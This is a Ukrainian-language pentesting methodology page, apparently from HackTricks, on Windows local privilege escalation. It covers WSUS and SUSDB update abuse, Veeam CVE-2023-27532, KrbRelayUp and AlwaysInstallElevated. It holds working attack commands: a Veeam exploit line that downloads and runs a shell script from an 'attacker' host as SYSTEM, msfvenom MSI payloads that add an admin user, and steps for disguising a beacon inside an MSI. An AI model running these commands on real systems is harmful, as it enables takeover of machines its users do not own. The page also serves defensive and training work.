# Підвищення привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

На цій сторінці зібрано загальну методологію підвищення привілеїв у Windows із кількох фундаментальних посібників.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Практичний процес перелікування системи також спирається на семінари й контрольні списки спільноти.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Історичний матеріал про атаки містить презентацію DerbyCon про підвищення привілеїв у Windows.<sup>[[5]](#references)</sup>

Для стислого огляду скористайтеся [контрольним списком підвищення локальних привілеїв](../checklist-windows-privilege-escalation.md).

## Основи Windows

### Токени доступу

**Якщо ви не знаєте, що таке токени доступу Windows, прочитайте цю сторінку, перш ніж продовжувати:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL — DACL/SACL/ACE

**Докладніше про ACL — DACL/SACL/ACE — дивіться на цій сторінці:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, прочитайте цю сторінку, перш ніж продовжувати:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби захисту Windows

У Windows є різні механізми, які можуть **завадити вам перелікувати систему**, запускати виконувані файли або навіть **виявити ваші дії**. Перш ніж починати перелікування для підвищення привілеїв, вам слід **прочитати** цю **сторінку** й **перелічити** всі ці **механізми** **захисту**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Фізичний доступ також дає змогу перетворити офлайнове редагування UEFI NVRAM на ланцюжок атак із DMA до завантаження системи та модифікацією пам’яті Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / непомітне підвищення привілеїв через UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів на підтвердження, якщо обійти перевірки безпечного шляху AppInfo. Дивіться спеціальний процес обходу UIAccess/Admin Protection тут:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Можна використати поширення параметрів реєстру доступності Secure Desktop для довільного запису в реєстр від імені SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У новіших збірках Windows також з’явився шлях LPE через **SMB на довільному порту**, за якого локальна автентифікація NTLM із привілейованими правами відбивається через повторно використане TCP-з’єднання SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

Щоб переглянути локальну інвентаризацію з наявного сеансу PowerShell, дивіться [Перелікування Windows за допомогою .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Ці приклади доповнюють наведені нижче перевірки, не запускаючи окремих виконуваних файлів для перелікування.

### Перелікування відомостей про версію

Перевірте, чи має версія Windows відомі вразливості (також перевірте встановлені виправлення).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Експлойти для версій

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку докладної інформації про вразливості безпеки Microsoft. У цій базі даних понад 4 700 вразливостей безпеки, що свідчить про **величезну поверхню атаки**, яку створює середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas містить вбудований watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — збирає дані про збірку ОС, установлені оновлення та відповідні потенційні бюлетені безпеки; перш ніж вважати результат актуальним, перевірте точний продукт і оновлення, що замінюють попередні.

Для локального експлойта, залежного від версії, перевіряйте **архітектуру запущеного процесу**, а також архітектуру ОС. У 64-бітній Windows для 32-бітного процесу діє [перенаправлення файлової системи WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` зазвичай відповідає 32-бітному системному каталогу, тоді як `%windir%\Sysnative` надає цьому процесу доступ до системного каталогу з нативною архітектурою. Для 64-бітного процесу цей псевдонім недоступний. Збірка ОС або потенційно відсутній KB не доводять, що експлойт спрацює; зіставте поточну збірку, установлене оновлення або оновлення, що його замінює, архітектуру процесу й передумови експлойта з [бюлетенем безпеки Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) для конкретної проблеми.

Приклад пошкодження пам’яті служби дивіться в описі [зміщень у кільцевому буфері спільної пам’яті MIDI, які контролює клієнт](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Опубліковані зміщення стека застосовні лише до перевіреної збірки; отримання прав `LOCAL SERVICE` — це окремий етап від подальшого переходу до `SYSTEM` за допомогою [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md).<sup>[[44]](#references)</sup>

**Локально, використовуючи інформацію про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії експлойтів на Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережені в змінних середовища облікові дані або інша Juicy-інформація?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Історія PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

Доступний для запису [профіль PowerShell](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) — це окремий напрямок для перевірки виконання під час запуску; перш ніж вважати його способом підвищення привілеїв, перевірте, чи користувач із вищими привілеями справді завантажує цей профіль.

### Файли транскриптів PowerShell

Як увімкнути цю функцію, описано тут: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` — лише приклад. [Політика транскрипції PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) зазвичай зберігає файли в папці Documents кожного користувача, але параметр `OutputDirectory` або `Start-Transcript -OutputDirectory` може перенаправити файли до спільної чи прихованої папки. Перш ніж переглядати транскрипт, перевірте фактичний шлях виводу та ACL файлу: він може містити аргументи команд і результати їх виконання, зокрема облікові дані. Доступний для читання транскрипт — це лише зачіпка, якщо його вміст розкриває придатний для використання обліковий запис із вищими привілеями, а цей обліковий запис може увійти в систему у відповідному контексті.

### Журналювання модулів PowerShell

Записуються відомості про виконання конвеєра PowerShell, зокрема виконані команди, виклики команд і частини скриптів. Однак повні відомості про виконання та результати можуть не фіксуватися.

Щоб увімкнути цю функцію, дотримуйтеся інструкцій у розділі документації «Файли транскриптів», вибравши **«Module Logging»** замість **«Powershell Transcription»**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Щоб переглянути останні 15 подій із журналів PowersShell, можна виконати:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Фіксується повний журнал активності та вмісту виконання скрипту, що гарантує документування кожного блоку коду під час його виконання. Цей процес забезпечує повний аудиторський слід кожної дії, цінний для криміналістичного аналізу та дослідження зловмисної поведінки. Документування всієї активності під час виконання дає змогу отримати детальне уявлення про процес.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Журнали подій для Script Block можна знайти в Переглядачі подій Windows за шляхом: **Журнали програм і служб > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, скористайтеся:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Налаштування Інтернету

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Диски

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

У попередніх рекомендаціях ризик було підсумовано так:

Ви можете скомпрометувати систему, якщо оновлення запитуються через http, а не http**S**.

Кінцева точка WSUS із HTTP — це підстава перевірити можливість перехоплення метаданих оновлень. Експлуатація також залежить від того, чи використовує клієнт цей сервер WSUS, чи може зловмисник перехоплювати або контролювати його трафік, а також від довіри клієнта до оновлень і політики їх встановлення. Сама URL-адреса не свідчить про можливість виконання коду. [Microsoft рекомендує використовувати TLS для метаданих WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Спершу перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd таку команду:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Або таке в PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Якщо ви отримали одну з таких відповідей:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Початкове твердження про можливість застосування було таким:

Тоді **це можна експлуатувати.** Якщо останнє значення в реєстрі дорівнює `0`, запис WSUS буде проігноровано.

Коли `UseWUServer` дорівнює `1`, Windows Update використовує налаштовану внутрішню службу. Це підтверджує передумову для перехоплення HTTP-трафіку, але не доводить, що перехоплення, прийняття шкідливого оновлення або його встановлення з підвищеними привілеями можливі. Коли значення дорівнює `0`, ця конкретна кінцева точка WSUS, налаштована через цю політику, не використовується.

Щоб експлуатувати ці вразливості, можна скористатися такими інструментами, як [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це озброєні MiTM-скрипти для впровадження «підроблених» оновлень у незашифрований SSL-трафік WSUS.

Дослідження можна прочитати тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Повний звіт читайте тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Загалом, ось у чому полягає вразливість, яку експлуатує цей баг:

> Якщо ми можемо змінювати проксі-сервер локального користувача, а Windows Updates використовує проксі-сервер, налаштований у параметрах Internet Explorer, то ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), перехопити власний трафік і виконати код на нашому пристрої від імені користувача з підвищеними привілеями.
>
> Крім того, оскільки служба WSUS використовує параметри поточного користувача, вона також використовуватиме його сховище сертифікатів. Якщо створити самопідписаний сертифікат для імені хоста WSUS і додати його до сховища сертифікатів поточного користувача, можна буде перехоплювати трафік WSUS як HTTP, так і HTTPS. WSUS не використовує механізми на кшталт HSTS для реалізації перевірки сертифіката за моделлю trust-on-first-use. Якщо користувач довіряє представленому сертифікату й у ньому вказано правильне ім’я хоста, служба прийме його.

Цю вразливість можна експлуатувати за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (після його випуску).

### Оновлення WSUS, якими керує адміністратор

Окремий шлях можливий, коли поточний обліковий запис може **публікувати й затверджувати** оновлення на сервері WSUS. Перевірте фактичне членство в групі `WSUS Administrators` на сервері та всі делеговані дозволи WSUS, а потім визначте групу комп’ютерів-клієнтів, якій буде надіслано затверджене оновлення. [Microsoft вимагає привілеїв адміністратора WSUS для затвердження оновлень](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) і [описує відносини довіри для публікування](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): клієнти мають довіряти сертифікату підпису, використаному для локально опублікованого вмісту. Перш ніж вважати це шляхом підвищення привілеїв, підтвердьте, що кандидатне оновлення підписане й приймається, застосовне до цільової системи та встановлюється в контексті з вищими привілеями. Самі лише значення HTTP `WUServer` або назва групи не підтверджують виконання цих умов.

### Зловживання спеціальними оновленнями SUSDB: непідписані payload-файли через `.txt`/`.esd`

Це інше порушення межі довіри, ніж перехоплення HTTP-з’єднання WSUS: необхідною передумовою є достатній доступ до **збережених процедур бази даних WSUS (`SUSDB`)**, щоб публікувати й затверджувати спеціальне оновлення. Один із практичних способів отримати такий доступ — передати автентифікацію облікового запису комп’ютера WSUS на окремий сервер MSSQL, де розміщено `SUSDB`; точні передумови залежать від розгортання, тому спершу перегляньте дозволи `EXECUTE`, а не припускайте наявність прав адміністратора SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Окремий шлях атаки, у якому автентифікація клієнта WSUS ретранслюється з HTTP/8530 до LDAP, SMB або AD CS, описано в розділі [Зловживання HTTP WSUS для NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Перевірка ретрансляції до зовнішньої бази даних і прав на процедури

У розгортаннях, де WSUS використовує зовнішній SQL Server, спершу перевірте, чи може обліковий запис сервера WSUS автентифікуватися в базі даних і чи доходить NTLM relay до цього прослуховувача. Роль SQL-сервера може надавати доступ до процедур публікування оновлень, навіть якщо прямий запис у таблиці заборонений; невдала команда `UPDATE` для `SUSDB` не доводить, що публікування заблоковане. Перш ніж намагатися опублікувати спеціальне оновлення, перевірте фактичний обліковий запис, членство в ролях і дозволи на процедури в авторизованому сеансі SQL.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Визначення процедур у системі та встановлений файл `SoftwareDistributionPackage.xsd` корисні для відтворення коректних метаданих оновлення. Для батьківського пакета та дочірнього payload потрібні `UpdateIdentity` (тип фрагмента `1`), `LocalizedProperties` (`4`) і `ExtendedProperties` (`2`); збережіть локальний ідентифікатор ревізії, який повертає кожен виклик `spImportUpdate`, та забезпечте узгодженість зв’язку пакета, дайджестів, розміру, URL-адреси вмісту й ревізії. Це робочий процес публікації зі збереженням стану, тому один успішний виклик збереженої процедури не доводить виконання на стороні клієнта.<sup>[[38]](#references)</sup>

#### Створіть, націльте й затвердьте оновлення

У робочому процесі створення власного оновлення використовуються легітимні процедури WSUS як обмежений API публікації. Важливі переходи стану:<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| Імпорт метаданих оновлення | `spImportUpdate` |
| Збереження фрагментів XML передумов, локалізованих і розширених властивостей | `spSaveXMLFragment` |
| Прив’язка дайджесту вмісту до контрольованої зловмисником URL-адреси | `spSetBatchURL` |
| Перелік/створення групи комп’ютерів і додавання клієнта | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Затвердження встановлення для цієї групи | `spDeployUpdate` з `@actionID = 0` і `@isAssigned = 1` |

Ім’я файлу, дайджести, розмір і обробник `CommandLineInstallation` мають бути узгоджені в імпортованих метаданих і фрагментах. Після призначення URL-адреси вмісту й цільової групи остаточне затвердження має приблизно такий вигляд; використовуйте нові ідентифікатори оновлення, групи й розгортання, а не повторно використовуйте GUID із прикладів.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS зазвичай відхиляє довільний непідписаний виконуваний вміст. Однак у `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` шлях .NET `VerifyFile` встановлює прапорець перевірки сертифіката в значення false, якщо передане ім’я файлу закінчується на `.txt` або `.esd`; `CheckCertificateSignature` після цього пропускається без попередньої перевірки, чи є байти текстом або справжнім образом ESD. Тому незмінений PE-файл із назвою, наприклад, `payload.exe.txt` може пройти перевірку вмісту, а згодом бути запущеним обробником командного рядка для встановлення оновлення. Це помилка плутанини типів у політиці, а не підроблення підпису.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Стейджинг і автоматизація, сумісні з BITS

Виклик `spDeployUpdate` змушує WSUS отримати зареєстрований вміст. Джерело має відповідати вимогам BITS до HTTP: самої доступності URL недостатньо, оскільки передавання використовує початковий потік `HEAD`/`GET` і запити діапазонів байтів. Сервер без підтримки Range спричиняє подію синхронізації WSUS `EventId=364` із повідомленням, що BITS вимагає заголовок протоколу Range.<sup>[[39]](#references)</sup>

Дослідницький PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) генерує SQL, необхідний для ланцюжка імпорту/фрагмента/URL/групи/розгортання, містить модифікований клієнт MSSQL для його виконання та постачається з `BitsWebServer.py` для стейджингу вмісту. Мінімальний запуск в авторизованій лабораторії:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Виконання без нагляду та persistence через повторні спроби

Взаємодія на стороні клієнта залежить від політики. Параметр `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` зі значенням `4 - Auto download and schedule install` забезпечує автоматичне завантаження та встановлення схваленого оновлення за налаштованим розкладом без ручного вибору користувачем. Під час тестування payload, оновлення якого залишалося невдалим/незавершеним, одразу знову пропонувався після завершення callback-процесу, тож поведінка повторних спроб може перетворитися на persistence через періодичне виконання; це помітно, оскільки клієнт показує стан помилки оновлення.<sup>[[39]](#references)</sup>

#### Напрями виявлення та посилення захисту

Корисні напрями перевірки на сервері та клієнті в межах цього ланцюжка:<sup>[[39]](#references)</sup>

- Перевіряйте виконання `spCreateTargetGroup`, `spSetBatchURL` і `spDeployUpdate` у `SUSDB`; досліджуйте нові групи цільових пристроїв, зовнішні джерела вмісту, payload оновлень `.txt`/`.esd` і розгортання, виконані неочікуваними принципалами (особливо обліковими записами, що не є обліковими записами комп’ютерів).
- Перевіряйте `C:\Program Files\Update Services\LogFiles` на наявність `ContentSyncAgent`, `FileVerified`, помилково написаного `FileVerficationFailed` і `EventId=364`; зіставляйте перевірку з розширенням payload і сигнатурою вмісту, а не покладайтеся на суфікс.
- Шукайте повторні збої/спроби встановлення Windows Update, а також виконання PE-файлів чи неочікувану дочірню/мережеву активність із вмісту, що має назви з розширеннями `.txt` або `.esd`.
- Вимагайте Extended Protection for Authentication для служби бази даних, якщо це підтримується, і обмежте мережевий доступ до бази даних сервером WSUS та авторизованими адміністративними системами. Зведіть до мінімуму права `EXECUTE` на процедурах користувацьких оновлень і перевіряйте їх.

## Сторонні засоби автоматичного оновлення та IPC агентів (local privesc)

Багато корпоративних агентів мають локальний IPC-інтерфейс і привілейований канал оновлення. Якщо процес реєстрації можна спрямувати на сервер зловмисника, а засіб оновлення довіряє шахрайському кореневому CA або використовує слабкі перевірки підпису, локальний користувач може доставити шкідливий MSI, який встановить служба SYSTEM. Узагальнену техніку (на основі ланцюжка Netskope stAgentSvc – CVE-2025-0309) описано тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Початковий опис для конкретної версії та примітка щодо розвідки:

Veeam B&R < `11.0.1.1261` відкриває локальну службу на **TCP/9401**, яка обробляє контрольовані зловмисником повідомлення, що дає змогу виконувати довільні команди від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Розвідка**: перевірте наявність слухача та версію, наприклад, за допомогою `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication і Cloud Connect використовують основну службу резервного копіювання, яка за замовчуванням працює на **TCP/9401**. [Рекомендації Veeam](https://www.veeam.com/kb4424) описують неавтентифіковане розкриття зашифрованих облікових даних до бази даних конфігурації в межах периметра мережі резервного копіювання; окремий публічний PoC демонструє шлях до виконання команд від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Служба може прив’язуватися не лише до localhost, тому перевірте її фактичну адресу та PID.

- **Розвідка**: переконайтеся, що TCP/9401 належить `Veeam.Backup.Service.exe`, а потім перевірте встановлений продукт і метадані виправлень. `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` — це підказки, а не повна перевірка встановлених виправлень.
- **Перші виправлені версії**: Veeam вказує **11a build 11.0.1.1261 P20230227** і **12 build 12.0.0.1420 P20230223** як перші виправлені випуски; попередні випуски вразливі. Версія файлу з чотирьох частин сама по собі не дає змоги відрізнити невиправлену базову збірку від пізнішого виправлення на тій самій збірці. Перш ніж вважати граничну збірку виправленою, перевірте ідентифікатор виправлення за [історією збірок постачальника](https://www.veeam.com/kb2680).
- **Експлуатація**: розмістіть PoC, наприклад `VeeamHax.exe`, разом із потрібними DLL-файлами Veeam в одному каталозі, а потім запустіть payload від імені SYSTEM через локальний сокет:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Служба виконує команду від імені SYSTEM.

У наведеному PoC показано виконання команд від імені SYSTEM за наявності додаткових передумов; у рекомендаціях постачальника описано проблему розкриття облікових даних.

## KrbRelayUp

Початковий опис середовища за замовчуванням:

У середовищах Windows **domain** за певних умов існує вразливість **local privilege escalation**. До цих умов належать середовища, де **LDAP signing не вимагається,** користувачі мають права self-rights, що дають їм змогу налаштовувати **Resource-Based Constrained Delegation (RBCD),** а також можуть створювати комп’ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за **налаштувань за замовчуванням**.

Локальний Kerberos relay може перетворити сеанс входу з нижчим рівнем привілеїв на запис у каталозі з підвищеними привілеями, якщо відповідний COM-сервер проходить автентифікацію, а ретрансльована особа має права на цільовий об’єкт. У [документації KrbRelay](https://github.com/cube0x0/KrbRelay) описано записи LDAP для RBCD і `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp автоматизує деякі з цих шляхів. Для ланцюжка RBCD потрібні відповідні права делегування та права на цільовий об’єкт, а для ланцюжка shadow-credential — права на запис ключових облікових даних і KDC, що підтримує автентифікацію на основі сертифікатів. Жоден із цих шляхів не доступний лише завдяки членству в домені.

Перевірте політики фактичного DC щодо [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) і [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL об’єкта для ретрансльованої особи, а також рівні автентифікації та імперсонації вибраного класу COM. Важливі тип входу користувача та контекст облікових даних: сеанс WinRM може поводитися інакше, ніж інтерактивний вхід або вхід із новими обліковими даними. На результат також можуть впливати маршрутизація через firewall/OXID і встановлені оновлення. Вважайте дозвільну політику або відповідний ACL приводом для перевірки; пасивне перерахування не повинно запускати примусову автентифікацію через COM, relay автентифікації чи записи в каталог. Shadow credential облікового запису комп’ютера може надати машинний ticket і, лише якщо цей обліковий запис має необхідні права реплікації каталогу, — окремий шлях DCSync.

Знайдіть **exploit у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Щоб дізнатися більше про перебіг атаки, перегляньте [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Якщо** ці 2 ключі реєстру **увімкнені** (значення **0x1**), користувачі з будь-яким рівнем привілеїв можуть **встановлювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Якщо у вас є сеанс Meterpreter, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Скористайтеся командою `Write-UserAddMSI` з PowerUp, щоб створити в поточному каталозі бінарний файл Windows MSI для підвищення привілеїв. Цей скрипт створює попередньо скомпільований інсталятор MSI, який пропонує додати користувача/групу (тому вам знадобиться доступ до GIU):

```
Write-UserAddMSI
```

Просто запустіть створений бінарний файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей посібник, щоб дізнатися, як створити MSI wrapper за допомогою цього інструмента. Зверніть увагу: можна обгорнути файл "**.bat**", якщо ви **лише** хочете **виконати** **командні рядки**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI за допомогою WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI за допомогою Visual Studio

- **Згенеруйте** за допомогою Cobalt Strike або Metasploit **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Вкажіть назву проєкту, наприклад **AlwaysPrivesc**, використайте `C:\privesc` як розташування, виберіть **place solution and project in the same directory** і натисніть **Create**.
- Натискайте **Next**, поки не дійдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Add** і виберіть щойно згенерований Beacon payload. Потім натисніть **Finish**.
- Виділіть проєкт **AlwaysPrivesc** у **Solution Explorer** і в **Properties** змініть **TargetPlatform** із **x86** на **x64**.
  - Також можна змінити інші властивості, як-от **Author** і **Manufacturer**, щоб установлений застосунок виглядав легітимнішим.
- Клацніть правою кнопкою миші проєкт і виберіть **View > Custom Actions**.
